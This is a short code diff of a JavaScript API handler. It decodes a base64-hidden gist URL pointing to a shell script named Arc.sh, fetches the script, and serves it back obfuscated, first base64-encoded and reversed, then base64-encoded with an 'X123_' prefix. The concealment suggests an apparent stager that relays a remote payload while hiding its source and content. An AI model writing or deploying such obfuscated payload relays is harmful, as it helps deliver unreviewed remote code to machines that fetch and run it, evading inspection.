@@ -1,12 +1,14 @@
 export default async function handler(req, res) {
-  const _G = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
-  const _U = Buffer.from(_G, 'base64').toString('utf8');
+  // Link Gist Lu
+  const G = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
+  const U = Buffer.from(G, 'base64').toString('utf8');
+  
   try {
-    const _R = await fetch(_U);
-    const _S = await _R.text();
-    const _O = Buffer.from(_S).toString('base64').split('').reverse().join('');
-    res.status(200).send(_O);
+    const R = await fetch(U);
+    const S = await R.text();
+    const P = Buffer.from(S).toString('base64');
+    res.status(200).send("X123_" + P);
   } catch (e) {
-    res.status(500).send("");
+    res.status(500).send("ERR");
   }
 }
